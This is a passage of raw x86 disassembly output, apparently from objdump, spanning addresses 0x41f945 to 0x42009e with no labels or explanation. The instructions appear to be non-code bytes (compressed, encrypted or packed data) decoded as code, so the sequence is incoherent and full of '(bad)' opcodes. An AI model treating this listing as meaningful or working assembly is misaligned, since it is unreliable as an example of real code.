  41f945:	and    DWORD PTR [ebx+0x1b],ecx
  41f948:	pop    ecx
  41f949:	pop    ebx
  41f94a:	add    BYTE PTR [ebp+0x6a],dl
  41f94d:	inc    edi
  41f94e:	cmp    edx,ebx
  41f950:	mov    dh,0xda
  41f952:	dec    ebp
  41f953:	es ja  0x41f9a5
  41f956:	inc    ebp
  41f957:	bound  ebx,QWORD PTR [ecx-0x6f]
  41f95a:	fwait
  41f95b:	cli    
  41f95c:	loop   0x41f914
  41f95e:	inc    edi
  41f95f:	mov    eax,ds:0x4e16ad92
  41f964:	mov    ch,0x42
  41f966:	push   0x0
  41f968:	sub    BYTE PTR ds:0x5fdcb1b,ch
  41f96e:	in     al,0x3f
  41f970:	loope  0x41f9a8
  41f972:	adc    al,0x8d
  41f974:	jbe    0x41f919
  41f976:	fst    st(2)
  41f978:	stos   BYTE PTR es:[edi],al
  41f979:	call   0x1cf2dae9
  41f97e:	outs   dx,BYTE PTR ds:[esi]
  41f97f:	jle    0x41f94c
  41f981:	mov    bh,0xb6
  41f983:	mov    dh,0xb8
  41f985:	xor    bh,BYTE PTR [ebp-0x4ab04693]
  41f98b:	out    0x0,al
  41f98d:	mov    ebp,0x2e36d4b3
  41f992:	ins    BYTE PTR es:[edi],dx
  41f993:	push   ebx
  41f994:	mov    WORD PTR [edi-0x59e71554],gs
  41f99a:	xlat   BYTE PTR ds:[ebx]
  41f99b:	gs stc 
  41f99d:	shl    BYTE PTR [esi+0x2d0211f5],cl
  41f9a3:	mov    edi,0x3600281a
  41f9a8:	add    esi,DWORD PTR [edx+0x3f97cb2c]
  41f9ae:	or     al,0x1c
  41f9b0:	add    BYTE PTR [eax],al
  41f9b2:	xor    eax,0xb2cb3e09
  41f9b7:	sub    al,0xcb
  41f9b9:	adc    ah,BYTE PTR [edi]
  41f9bb:	sbb    esp,DWORD PTR [eax]
  41f9bd:	in     al,dx
  41f9be:	fldcw  WORD PTR [ebx+ecx*8]
  41f9c1:	mov    dl,0x2c
  41f9c3:	in     eax,0xd2
  41f9c5:	dec    bl
  41f9c7:	test   DWORD PTR [edx+0x61],0x37c4b0bb
  41f9ce:	enter  0x80d8,0xd4
  41f9d2:	in     eax,0x10
  41f9d4:	mov    DWORD PTR [eax-0x23093d2c],edi
  41f9da:	fisub  DWORD PTR [ecx]
  41f9dc:	out    dx,eax
  41f9dd:	les    ebp,FWORD PTR [eax+0x59]
  41f9e0:	xchg   esi,eax
  41f9e1:	test   DWORD PTR [ebp+0x7f9471f8],ebp
  41f9e7:	sbb    DWORD PTR [ebp-0x69224b76],0x8f938665
  41f9f1:	out    0x9c,al
  41f9f3:	pushf  
  41f9f4:	cwde   
  41f9f5:	cwde   
  41f9f6:	adc    bl,BYTE PTR [ebx-0x7b]
  41f9f9:	mov    ds:0xaeac5acb,al
  41f9fe:	jg     0x41f9df
  41fa00:	mov    eax,0xb7a2cbfc
  41fa05:	test   BYTE PTR [eax],al
  41fa07:	stos   DWORD PTR es:[edi],eax
  41fa08:	add    BYTE PTR [eax],0xb0
  41fa0b:	pop    esp
  41fa0c:	js     0x41fa2c
  41fa0e:	je     0x41fa10
  41fa10:	push   ebp
  41fa11:	jo     0x41f9c0
  41fa13:	fstp   QWORD PTR [edx+0x28]
  41fa16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa17:	dec    esi
  41fa18:	scas   eax,DWORD PTR es:[edi]
  41fa19:	add    DWORD PTR [ebx],esp
  41fa1b:	jecxz  0x41f9af
  41fa1d:	stc    
  41fa1e:	ret    0xc2ad
  41fa21:	or     ah,BYTE PTR [edi+0x4f]
  41fa24:	shl    BYTE PTR [ebx],1
  41fa26:	scas   eax,DWORD PTR es:[edi]
  41fa27:	(bad)  
  41fa28:	stos   DWORD PTR es:[edi],eax
  41fa29:	add    BYTE PTR [edi+esi*8],bh
  41fa2c:	jno    0x41fa99
  41fa2e:	stc    
  41fa2f:	inc    edx
  41fa30:	call   0xfd2e:0x8900ff25
  41fa37:	repnz xor edx,0x6d
  41fa3b:	pop    ebx
  41fa3c:	mov    esi,0xfb008fab
  41fa41:	mov    edx,DWORD PTR [edi-0x60c46c65]
  41fa47:	add    ch,ah
  41fa49:	fwait
  41fa4a:	in     eax,dx
  41fa4b:	(bad)  
  41fa4c:	pop    ss
  41fa4d:	fld    TBYTE PTR [edx-0x28e18453]
  41fa53:	in     al,0x74
  41fa55:	outs   dx,DWORD PTR ds:[esi]
  41fa56:	fwait
  41fa57:	test   ebx,ebx
  41fa59:	push   ss
  41fa5a:	sbb    esi,DWORD PTR [ebx]
  41fa5c:	ins    DWORD PTR es:[edi],dx
  41fa5d:	inc    DWORD PTR [esi]
  41fa5f:	dec    ebp
  41fa60:	data16 xchg BYTE PTR [ebx],dl
  41fa63:	imul   ebp,DWORD PTR [ebx],0x1df2db
  41fa69:	mov    DWORD PTR [ecx+0x11b6950a],esi
  41fa6f:	stc    
  41fa70:	sub    al,0x6d
  41fa72:	retf   
  41fa73:	jb     0x41fad6
  41fa75:	mov    ch,0x49
  41fa77:	xchg   ecx,eax
  41fa78:	test   BYTE PTR [ecx],ah
  41fa7a:	lea    edx,[edx-0x249e9ad2]
  41fa80:	adc    al,0x9b
  41fa82:	mov    ebp,0x559b9837
  41fa87:	cmp    al,0x2f
  41fa89:	push   0xcdda6ff9
  41fa8e:	inc    ebp
  41fa8f:	add    cl,cl
  41fa91:	jmp    0xfe84bf96
  41fa96:	and    edi,DWORD PTR [ebx+0x7d6e95b0]
  41fa9c:	aad    0x50
  41fa9e:	loopne 0x41fa83
  41faa0:	in     eax,dx
  41faa1:	int    0xe9
  41faa3:	lds    ebp,FWORD PTR [ebx-0x1b]
  41faa6:	dec    ebx
  41faa7:	dec    ebx
  41faa8:	inc    ecx
  41faa9:	push   es
  41faaa:	fiadd  DWORD PTR [esi-0x2c06ff81]
  41fab0:	mov    ebx,0xb66e0595
  41fab5:	icebp  
  41fab6:	sub    cl,cl
  41fab8:	lea    ecx,[edx+0x5]
  41fabb:	cli    
  41fabc:	mov    ecx,0x60596a94
  41fac1:	push   es
  41fac2:	leave  
  41fac3:	jecxz  0x41fad4
  41fac5:	bound  esp,QWORD PTR [ecx+0x43]
  41fac8:	mov    ah,0x2c
  41faca:	popa   
  41facb:	xor    al,0xd1
  41facd:	pop    ebx
  41face:	and    ebx,esi
  41fad0:	rcr    DWORD PTR [eax-0x6a],cl
  41fad3:	gs arpl di,di
  41fad6:	stos   DWORD PTR es:[edi],eax
  41fad7:	(bad)  
  41fad8:	sub    ecx,esp
  41fada:	push   eax
  41fadb:	or     edx,DWORD PTR [edi-0x4a2ca0d8]
  41fae1:	add    BYTE PTR [ecx+0x59],cl
  41fae4:	inc    eax
  41fae5:	inc    ecx
  41fae6:	dec    esi
  41fae7:	jmp    0x41fa94
  41fae9:	mov    dl,0xb5
  41faeb:	ins    BYTE PTR es:[edi],dx
  41faec:	sub    eax,0x7ca02b47
  41faf1:	adc    ebx,DWORD PTR [ecx-0x34d7a394]
  41faf7:	jne    0x41fa8f
  41faf9:	fnstcw WORD PTR [ebp-0x71]
  41fafc:	jmp    DWORD PTR [ebx-0x4e]
  41faff:	sub    al,0xdb
  41fb01:	mov    dl,0x84
  41fb03:	cwde   
  41fb04:	mov    edi,0xb26a917d
  41fb09:	sub    eax,0xeb96c2cb
  41fb0e:	jae    0x41faaf
  41fb10:	js     0x41fad1
  41fb12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb13:	retf   
  41fb14:	mov    dl,0x2c
  41fb16:	retf   
  41fb17:	inc    ecx
  41fb18:	lods   eax,DWORD PTR ds:[esi]
  41fb19:	dec    esi
  41fb1a:	mov    dl,0x57
  41fb1c:	mov    ebx,0x2a19b06e
  41fb21:	adc    DWORD PTR [ebx-0x36874c84],esi
  41fb27:	ins    BYTE PTR es:[edi],dx
  41fb28:	mov    cl,0x6d
  41fb2a:	adc    eax,0x7a705204
  41fb2f:	ins    BYTE PTR es:[edi],dx
  41fb30:	push   ecx
  41fb31:	push   0x6c2c2e23
  41fb36:	shl    BYTE PTR [ebx+ebp*8+0x60],cl
  41fb3a:	mov    ebx,0x69c50c5c
  41fb3f:	(bad)  [eax-0x5d]
  41fb42:	push   esp
  41fb43:	xor    edx,DWORD PTR [eax-0x53]
  41fb46:	dec    esp
  41fb47:	sbb    eax,0x85b76848
  41fb4c:	test   DWORD PTR [ebp+0x44],ebp
  41fb4f:	xchg   edx,eax
  41fb50:	inc    eax
  41fb51:	xor    DWORD PTR [ecx+eax*8-0x264b8248],edi
  41fb58:	retf   
  41fb59:	mov    bh,0xb6
  41fb5b:	or     cl,BYTE PTR [ebx-0x57745363]
  41fb61:	push   0x0
  41fb63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb64:	mov    al,ds:0x1b0b4b4b
  41fb69:	arpl   WORD PTR [esp+esi*8-0xd6b7668],bx
  41fb70:	nop
  41fb71:	or     ebp,DWORD PTR [esp+ebp*2]
  41fb74:	ins    BYTE PTR es:[edi],dx
  41fb75:	push   0x4f88398c
  41fb7a:	test   BYTE PTR [ebp-0x80],dh
  41fb7d:	fistp  DWORD PTR [edx-0x42]
  41fb80:	sub    eax,0x34f892fc
  41fb85:	add    ah,dh
  41fb87:	lock or ch,ah
  41fb8a:	inc    esp
  41fb8b:	gs pop ecx
  41fb8d:	mov    esi,0xbf22e874
  41fb92:	xchg   DWORD PTR [eax],eax
  41fb94:	loopne 0x41fbb1
  41fb96:	mov    ds:0xf97cb80e,al
  41fb9b:	push   esi
  41fb9c:	das    
  41fb9d:	rcl    BYTE PTR [edi],1
  41fb9f:	add    ah,cl
  41fba1:	enter  0x1c,0xc4
  41fba5:	shl    ch,0xb
  41fba8:	pop    ebx
  41fba9:	fist   DWORD PTR [esi-0x42]
  41fbac:	cmp    BYTE PTR [eax],bh
  41fbae:	ds xor al,0x67
  41fbb1:	xor    ah,al
  41fbb3:	sub    al,0x5b
  41fbb5:	dec    ebx
  41fbb6:	sbb    esp,DWORD PTR [ebp+0x244e2354]
  41fbbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbbd:	and    ah,bl
  41fbbf:	sbb    al,0x17
  41fbc1:	or     dl,BYTE PTR [edi-0x39e71991]
  41fbc7:	add    BYTE PTR [eax+edx*1],dl
  41fbca:	fild   WORD PTR [ebx-0xc]
  41fbcd:	push   cs
  41fbce:	mov    edi,0x685c2f96
  41fbd3:	jecxz  0x41fc21
  41fbd5:	add    al,0xc4
  41fbd7:	pop    ebx
  41fbd8:	push   ecx
  41fbd9:	add    BYTE PTR [edx-0x33],bh
  41fbdc:	pop    esi
  41fbdd:	arpl   WORD PTR [ecx-0x2d4020d4],bp
  41fbe3:	add    ah,ch
  41fbe5:	inc    edi
  41fbe6:	fucomi st,st(1)
  41fbe8:	cs pushf 
  41fbea:	das    
  41fbeb:	pop    edi
  41fbec:	mov    esi,0x1cf37c
  41fbf1:	addr16 hlt 
  41fbf3:	adc    al,0x0
  41fbf5:	pusha  
  41fbf6:	in     eax,dx
  41fbf7:	or     al,0x0
  41fbf9:	jns    0x41fbe1
  41fbfb:	add    al,0x0
  41fbfd:	repnz in eax,0xcb
  41fc00:	xchg   edi,eax
  41fc01:	jb     0x41fc22
  41fc03:	cld    
  41fc04:	add    BYTE PTR [ebx-0x7bff0bf0],cl
  41fc0a:	or     esp,ebp
  41fc0c:	add    BYTE PTR [ebp-0x683449f],bl
  41fc12:	add    ah,ah
  41fc14:	add    BYTE PTR [esi-0x50ff23c5],dl
  41fc1a:	sub    al,0xd4
  41fc1c:	xchg   ebp,eax
  41fc1d:	enter  0xb079,0xb1
  41fc21:	sub    eax,0x5c3e01c5
  41fc26:	retf   0x479c
  41fc29:	das    
  41fc2a:	(bad)  
  41fc2c:	dec    edx
  41fc2d:	pop    esp
  41fc2e:	sahf   
  41fc2f:	dec    eax
  41fc30:	mov    ds:0x5100a8bc,al
  41fc35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc36:	mov    al,ds:0x46f35a00
  41fc3b:	xchg   edi,eax
  41fc3c:	pop    edx
  41fc3d:	scas   al,BYTE PTR es:[edi]
  41fc3e:	cwde   
  41fc3f:	sub    ebx,DWORD PTR [eax+eax*1-0x7a106b69]
  41fc46:	in     eax,0xcb
  41fc48:	aaa    
  41fc49:	pushf  
  41fc4a:	jge    0x41fbd8
  41fc4c:	add    BYTE PTR [ecx-0x7dff7b8a],cl
  41fc52:	(bad)  
  41fc53:	sbb    al,0x8a
  41fc55:	outs   dx,BYTE PTR ds:[esi]
  41fc56:	jne    0x41fc1c
  41fc58:	jnp    0x41fcca
  41fc5a:	mov    edi,0x6c996174
  41fc5f:	pop    ebp
  41fc60:	pop    eax
  41fc61:	push   0x6492e2ec
  41fc66:	push   edi
  41fc67:	sbb    DWORD PTR [ebx-0x54afa093],ebp
  41fc6d:	jl     0x41fc68
  41fc6f:	mov    dh,0xf5
  41fc71:	push   esp
  41fc72:	dec    edx
  41fc73:	dec    eax
  41fc74:	add    ch,al
  41fc76:	dec    esp
  41fc77:	inc    eax
  41fc78:	add    dh,cl
  41fc7a:	inc    esp
  41fc7b:	icebp  
  41fc7c:	stc    
  41fc7d:	jbe    0x41fce0
  41fc7f:	arpl   WORD PTR [edi-0x478fdcbb],si
  41fc85:	xor    al,0x7a
  41fc87:	sub    BYTE PTR [eax],al
  41fc89:	mov    eax,ds:0xfb65962c
  41fc8e:	push   0xbf3e2220
  41fc93:	xchg   ebx,eax
  41fc94:	pop    es
  41fc95:	xchg   esp,eax
  41fc96:	pop    ecx
  41fc97:	xchg   esi,eax
  41fc98:	gs pop ecx
  41fc9a:	add    BYTE PTR [ebp+0x65128619],cl
  41fca0:	pop    ecx
  41fca1:	xchg   esi,eax
  41fca2:	gs jg  0x41fc90
  41fca5:	jo     0x41fc8b
  41fca7:	imul   edx,DWORD PTR [esi-0x269a69b],0xcf5bf662
  41fcb1:	dec    esp
  41fcb2:	pop    ecx
  41fcb3:	xchg   esi,eax
  41fcb4:	gs pop ecx
  41fcb6:	clc    
  41fcb7:	push   ebp
  41fcb8:	loope  0x41fd18
  41fcba:	jmp    0x9327:0x6596db75
  41fcc1:	sub    BYTE PTR [edi],dl
  41fcc3:	int3   
  41fcc4:	xchg   ebp,eax
  41fcc5:	cmc    
  41fcc6:	mov    bh,0xb6
  41fcc8:	mov    dh,0x7c
  41fcca:	retf   
  41fccb:	out    dx,al
  41fccc:	cs sahf 
  41fcce:	add    BYTE PTR [edi],bh
  41fcd0:	outs   dx,DWORD PTR ds:[esi]
  41fcd1:	mov    ch,cl
  41fcd3:	mov    DWORD PTR ds:0xdc14d0c0,eax
  41fcd9:	mov    edi,0xf9d2f302
  41fcde:	adc    ebp,DWORD PTR [edi+edi*1+0x2e]
  41fce2:	xor    eax,0x6cfa083f
  41fce7:	cmp    al,0xe3
  41fce9:	sub    DWORD PTR [esi+0x46],0xb
  41fced:	push   ss
  41fcee:	outs   dx,BYTE PTR ds:[esi]
  41fcef:	pcmpeqw mm0,mm1
  41fcf2:	mov    edi,0x75c41fce
  41fcf7:	mov    eax,0xa3636da9
  41fcfc:	hlt    
  41fcfd:	push   ecx
  41fcfe:	or     cl,cl
  41fd00:	(bad)  
  41fd01:	adc    DWORD PTR [ecx-0x3bca4758],esi
  41fd07:	ins    DWORD PTR es:[edi],dx
  41fd08:	out    0x4a,eax
  41fd0a:	mov    dl,0x62
  41fd0c:	xchg   esi,eax
  41fd0d:	popf   
  41fd0e:	mov    edi,0xc2e34b9a
  41fd13:	(bad)  
  41fd14:	fadd   DWORD PTR [esi]
  41fd16:	adc    DWORD PTR [edi+0x76b888e3],ebx
  41fd1c:	add    edx,DWORD PTR [esi+edx*8-0x48]
  41fd20:	ins    BYTE PTR es:[edi],dx
  41fd21:	pop    ebx
  41fd22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd23:	fld    QWORD PTR ds:0x21ef3dbb
  41fd29:	mov    edi,0xebedb659
  41fd2e:	sub    DWORD PTR [eax],ebx
  41fd30:	jg     0x41fd6a
  41fd32:	lds    edi,FWORD PTR [esi+0x654737bf]
  41fd38:	pop    ecx
  41fd39:	xchg   esi,eax
  41fd3a:	xor    DWORD PTR gs:[eax+0x3c],ecx
  41fd3e:	push   ecx
  41fd3f:	es mov dh,0x65
  41fd42:	pop    ecx
  41fd43:	xchg   esi,eax
  41fd44:	pop    edx
  41fd45:	and    eax,0xad641e63
  41fd4a:	cmp    al,0xb7
  41fd4c:	lods   eax,DWORD PTR ds:[esi]
  41fd4d:	mov    al,0xdd
  41fd4f:	xor    dl,BYTE PTR [ebp-0x5ffdfa05]
  41fd55:	es enter 0xbb9,0xe6
  41fd5a:	mov    ch,BYTE PTR [ebp-0x57]
  41fd5d:	ins    DWORD PTR es:[edi],dx
  41fd5e:	enter  0xe388,0x4d
  41fd62:	push   esp
  41fd63:	das    
  41fd64:	mov    ds,WORD PTR [edx-0x22]
  41fd67:	cs xchg esp,eax
  41fd69:	jg     0x41fdb7
  41fd6b:	in     eax,dx
  41fd6c:	xlat   BYTE PTR ds:[ebx]
  41fd6d:	sti    
  41fd6e:	add    eax,0x4bdadc00
  41fd73:	pop    edi
  41fd74:	pop    esp
  41fd75:	(bad)  
  41fd77:	aad    0x47
  41fd79:	mov    dh,BYTE PTR [ecx+ebx*4+0x62]
  41fd7d:	sub    DWORD PTR [edi+0x16],0xffffffb6
  41fd81:	lods   eax,DWORD PTR ds:[esi]
  41fd82:	adc    eax,0x3e91f2de
  41fd87:	(bad)  
  41fd88:	sub    al,0x18
  41fd8a:	jbe    0x41fd67
  41fd8c:	fisubr DWORD PTR ds:0x590f2a8a
  41fd92:	je     0x41fd1b
  41fd94:	sub    DWORD PTR [eax],edi
  41fd96:	push   es
  41fd97:	jno    0x41fd1e
  41fd99:	bound  ebp,QWORD PTR [ebx-0x49]
  41fd9c:	bnd jmp 0x41fd5f
  41fd9f:	enter  0x15e0,0x6
  41fda3:	rcl    DWORD PTR [esi-0x5b6d494a],1
  41fda9:	mov    ecx,eax
  41fdab:	xor    DWORD PTR [eax+0x55d808ab],eax
  41fdb1:	xor    al,0xb5
  41fdb3:	cmp    al,0x67
  41fdb5:	stc    
  41fdb6:	in     eax,0xcf
  41fdb8:	cmp    dl,BYTE PTR [ecx+eiz*4]
  41fdbb:	mov    DWORD PTR [esi-0x219e62f7],esi
  41fdc1:	jp     0x41fd99
  41fdc3:	repnz sbb DWORD PTR [edx+0x6d695b0b],ecx
  41fdca:	push   eax
  41fdcb:	pop    esp
  41fdcc:	push   cs
  41fdcd:	dec    esp
  41fdce:	jle    0x41fd88
  41fdd0:	mov    ch,0xad
  41fdd2:	push   0xffffffbb
  41fdd4:	push   ds
  41fdd5:	ficom  DWORD PTR [bp+di+0x58]
  41fdd9:	arpl   WORD PTR [edi+0x6e23add2],cx
  41fddf:	adc    edx,DWORD PTR [eax+ebp*2+0x34ac659]
  41fde6:	add    DWORD PTR [eax],ecx
  41fde8:	test   DWORD PTR [ebp-0x30],ecx
  41fdeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdec:	push   eax
  41fded:	inc    BYTE PTR [ebx]
  41fdef:	pop    edx
  41fdf0:	out    dx,al
  41fdf1:	ds retf 0xc01a
  41fdf5:	mov    dh,0x95
  41fdf7:	jl     0x41fe4f
  41fdf9:	mov    esp,0xb52f942c
  41fdfe:	mov    esp,0xe60bddb5
  41fe03:	and    eax,0x710a1def
  41fe08:	add    ah,ah
  41fe0a:	jl     0x41fe64
  41fe0c:	fcmovu st,st(2)
  41fe0e:	push   ss
  41fe0f:	mov    ebp,0x92fb05ef
  41fe14:	adc    al,0xe1
  41fe16:	sub    eax,0x735a5a5f
  41fe1b:	out    dx,eax
  41fe1c:	loopne 0x41fe91
  41fe1e:	push   ebx
  41fe1f:	(bad)  
  41fe20:	int3   
  41fe21:	add    BYTE PTR [esi-0x455972b5],ch
  41fe27:	sub    eax,0xe780b65f
  41fe2c:	fidivr DWORD PTR [esi]
  41fe2e:	mov    edx,0xbe50b6d8
  41fe33:	les    edx,FWORD PTR [eax]
  41fe35:	or     eax,0x19009a6a
  41fe3a:	test   al,0x13
  41fe3c:	add    bh,BYTE PTR [esi+ebp*1-0x471291cb]
  41fe43:	mov    edx,0xbeb10871
  41fe48:	aas    
  41fe49:	sub    al,0x34
  41fe4b:	mov    ebp,0x829a25b
  41fe50:	jmp    0xb768:0xe0a3d066
  41fe57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe58:	jbe    0x41fe6e
  41fe5a:	lods   al,BYTE PTR ds:[esi]
  41fe5b:	inc    ecx
  41fe5c:	cmp    BYTE PTR [esi],ch
  41fe5e:	push   esi
  41fe5f:	jmp    0x5858:0xdb76bc55
  41fe66:	jbe    0x41fe4b
  41fe68:	and    dl,BYTE PTR [esi+0x54]
  41fe6b:	fild   DWORD PTR ds:0x43654544
  41fe71:	pop    esp
  41fe72:	sub    bh,bh
  41fe74:	add    DWORD PTR [eax],0xf800a44f
  41fe7a:	mov    esi,0x7eb778fe
  41fe7f:	sbb    eax,DWORD PTR [ebp+0x2c3a5ba5]
  41fe85:	out    0x61,eax
  41fe87:	enter  0xbba5,0x72
  41fe8b:	add    al,0xe8
  41fe8d:	(bad)  
  41fe8e:	(bad)  
  41fe8f:	inc    esi
  41fe90:	pop    esi
  41fe91:	ucomiss xmm3,DWORD PTR [eax-0x5d6b5557]
  41fe98:	mov    dh,0x6d
  41fe9a:	sub    BYTE PTR [edi+0x49629d07],bl
  41fea0:	or     BYTE PTR [eax-0x30],dh
  41fea3:	mov    eax,0x251cd555
  41fea8:	cmp    al,BYTE PTR [esi]
  41feaa:	outs   dx,BYTE PTR ds:[esi]
  41feab:	pop    ebx
  41feac:	popa   
  41fead:	mov    eax,ds:0xee2c3da
  41feb2:	sbb    dh,BYTE PTR [ecx]
  41feb4:	or     BYTE PTR [eax],dh
  41feb6:	sbb    eax,0x1eb69607
  41febb:	sahf   
  41febc:	retf   
  41febd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41febe:	pop    ss
  41febf:	scas   al,BYTE PTR es:[edi]
  41fec0:	call   FWORD PTR [ebx+0x5b]
  41fec3:	sub    al,BYTE PTR [eax+0xb]
  41fec6:	adc    esp,DWORD PTR [eax]
  41fec8:	es push 0x6d433b9a
  41fece:	(bad)  [eax-0x60]
  41fed1:	mov    ch,0x13
  41fed3:	jp     0x41ff27
  41fed5:	dec    eax
  41fed6:	pop    es
  41fed7:	mov    dh,0xb4
  41fed9:	jl     0x41ff3c
  41fedb:	mov    dl,0xe5
  41fedd:	cs pop edx
  41fedf:	add    BYTE PTR [ebx+0x755cce38],bh
  41fee5:	fild   DWORD PTR [ebp+0x2eddb62d]
  41feec:	scas   al,BYTE PTR es:[edi]
  41feed:	inc    esi
  41feee:	rol    BYTE PTR [ebx-0x562a4c95],1
  41fef4:	or     DWORD PTR [esi],esi
  41fef6:	add    al,0xb3
  41fef8:	push   esp
  41fef9:	sub    DWORD PTR [ebp*2+0xd556c26],edx
  41ff00:	(bad)  
  41ff01:	rcl    ch,1
  41ff03:	enter  0xc096,0xb6
  41ff07:	adc    eax,0xac2c67e
  41ff0c:	xor    edx,esi
  41ff0e:	push   eax
  41ff0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff10:	(bad)  
  41ff11:	(bad)  
  41ff12:	cs pop edi
  41ff14:	mov    esi,0x780254
  41ff19:	fbstp  TBYTE PTR [eax+0x61]
  41ff1c:	add    BYTE PTR [edx],dl
  41ff1e:	call   0x753abe37
  41ff23:	imul   edi,ecx,0x44a3f3d6
  41ff29:	or     al,BYTE PTR [eax]
  41ff2b:	lea    edi,cs:[edx-0x4f49193d]
  41ff32:	push   ebp
  41ff33:	mov    esi,0xec00dc1a
  41ff38:	mov    ah,0x46
  41ff3a:	adc    eax,0xbae953f4
  41ff3f:	aam    0xc2
  41ff41:	ret    0xa61e
  41ff44:	push   es
  41ff45:	mov    dl,0xa5
  41ff47:	ret    
  41ff48:	dec    ecx
  41ff49:	or     eax,DWORD PTR [eax+0x1f50b6db]
  41ff4f:	jns    0x41ff10
  41ff51:	dec    ebp
  41ff52:	out    0xe9,al
  41ff54:	jnp    0x41fef7
  41ff56:	sub    al,0x17
  41ff58:	or     bl,BYTE PTR [ebx+0x491674be]
  41ff5e:	jns    0x41ff52
  41ff60:	imul   esi,DWORD PTR [ebp+0x6b6da236],0xa4fa7d1b
  41ff6a:	les    esi,FWORD PTR [edx+0x51]
  41ff6d:	(bad)  
  41ff6e:	test   al,0xad
  41ff70:	sub    edx,DWORD PTR [ecx-0x1a]
  41ff73:	mov    esp,0xc2d4695f
  41ff78:	in     eax,0x5b
  41ff7a:	in     eax,dx
  41ff7b:	adc    al,BYTE PTR [edi+ebx*2]
  41ff7e:	scas   eax,DWORD PTR es:[edi]
  41ff7f:	scas   al,BYTE PTR es:[edi]
  41ff80:	lea    eax,[eax]
  41ff82:	jnp    0x41ff50
  41ff84:	fwait
  41ff85:	jg     0x41ff49
  41ff87:	mov    dh,0xf0
  41ff89:	shr    edx,1
  41ff8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff8c:	sbb    DWORD PTR [edx-0x26efd389],0xffffffa0
  41ff93:	sub    eax,0xb022db44
  41ff98:	inc    edx
  41ff99:	inc    eax
  41ff9a:	push   esi
  41ff9b:	(bad)  
  41ff9c:	ins    DWORD PTR es:[edi],dx
  41ff9d:	ins    DWORD PTR es:[edi],dx
  41ff9e:	or     ecx,DWORD PTR ds:0x8f812eb9
  41ffa4:	and    BYTE PTR [ecx-0x5d],bh
  41ffa7:	stc    
  41ffa8:	mov    dh,0xb1
  41ffaa:	mov    al,0x98
  41ffac:	cmp    bl,ah
  41ffae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffaf:	test   BYTE PTR [eax+0x33bb35],ch
  41ffb5:	and    al,0xc2
  41ffb7:	lods   eax,DWORD PTR ds:[esi]
  41ffb8:	lea    ebp,[ebp+0x1e]
  41ffbb:	xor    dh,BYTE PTR [esi+0x75]
  41ffbe:	shr    esi,cl
  41ffc0:	push   esi
  41ffc1:	xchg   ebx,eax
  41ffc2:	adc    ebp,DWORD PTR [ebp-0x110d241b]
  41ffc8:	add    ah,cl
  41ffca:	adc    DWORD PTR [ebx+0x480068df],esi
  41ffd0:	jp     0x41ff84
  41ffd2:	and    eax,0x2a8ddb6a
  41ffd7:	push   es
  41ffd8:	test   DWORD PTR [esi+0xb],0x5f900862
  41ffdf:	pop    ss
  41ffe0:	sahf   
  41ffe1:	mov    dh,0x7d
  41ffe3:	aam    0xea
  41ffe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffe6:	mov    edi,0x168c0f2e
  41ffeb:	fwait
  41ffec:	mov    dh,0xb6
  41ffee:	push   ecx
  41ffef:	mov    ah,0x86
  41fff1:	xchg   BYTE PTR [ecx],dl
  41fff3:	lahf   
  41fff4:	fcmovbe st,st(1)
  41fff6:	loope  0x41ffd3
  41fff8:	mov    dh,0xd1
  41fffa:	mov    ch,bl
  41fffc:	stos   DWORD PTR es:[edi],eax
  41fffd:	das    
  41fffe:	xor    eax,0xade4a1f5
  420003:	sub    eax,0x82dba0ec
  420008:	and    DWORD PTR [esi-0x42],ebp
  42000b:	cmp    DWORD PTR [eax],ecx
  42000d:	lds    esi,FWORD PTR [esi-0x483d5a2a]
  420013:	inc    ebx
  420014:	xor    DWORD PTR [esi+0x38584de2],eax
  42001a:	pop    esi
  42001b:	mov    eax,ds:0x5ce1b175
  420020:	leave  
  420021:	mov    DWORD PTR [ecx],edi
  420023:	mov    dl,BYTE PTR [esp+edi*2]
  420026:	in     eax,dx
  420027:	sbb    al,0xc4
  420029:	jbe    0x41ffd1
  42002b:	inc    ebp
  42002c:	lods   eax,DWORD PTR ds:[esi]
  42002d:	popa   
  42002e:	imul   cl
  420030:	dec    esp
  420031:	mov    ds:0xadb6170a,al
  420036:	imul   esi,DWORD PTR [edi-0x50],0x35
  42003a:	(bad)  
  42003b:	lods   al,BYTE PTR ds:[esi]
  42003c:	inc    esi
  42003d:	shl    DWORD PTR [edi],0x57
  420040:	mov    ds:0x4a05d8da,eax
  420045:	ret    
  420046:	add    DWORD PTR [ebx],edx
  420048:	push   ss
  420049:	inc    edi
  42004a:	dec    ebx
  42004b:	les    eax,FWORD PTR [ebx+0x49]
  42004e:	lods   al,BYTE PTR ds:[esi]
  42004f:	pop    ss
  420050:	aam    0xd0
  420052:	push   ss
  420053:	pop    esp
  420054:	pop    bx
  420056:	and    BYTE PTR [edi+0x5e],0x20
  42005a:	dec    esp
  42005b:	fldenv [ebx+0x62a85829]
  420061:	mov    eax,0x501e214b
  420066:	pop    esp
  420067:	test   al,0x74
  420069:	dec    edi
  42006a:	test   eax,0xb5325cec
  42006f:	ins    DWORD PTR es:[edi],dx
  420070:	xor    eax,0x3427d740
  420075:	or     al,ah
  420077:	cs or  eax,0x76da03d3
  42007d:	mov    ds:0x724bfd44,eax
  420082:	mov    eax,ds:0x54c8abef
  420087:	scas   al,BYTE PTR es:[edi]
  420088:	pop    edx
  420089:	aaa    
  42008a:	and    DWORD PTR [eax],esp
  42008c:	pop    edi
  42008d:	and    cl,bl
  42008f:	in     eax,dx
  420090:	mov    eax,ds:0xc7046ada
  420095:	xlat   BYTE PTR ds:[ebx]
  420096:	dec    ebp
  420097:	ret    0xda1a
  42009a:	push   ss
  42009b:	mov    dh,0xc2
  42009d:	aaa    
  42009e:	scas   al,BYTE PTR es:[edi]
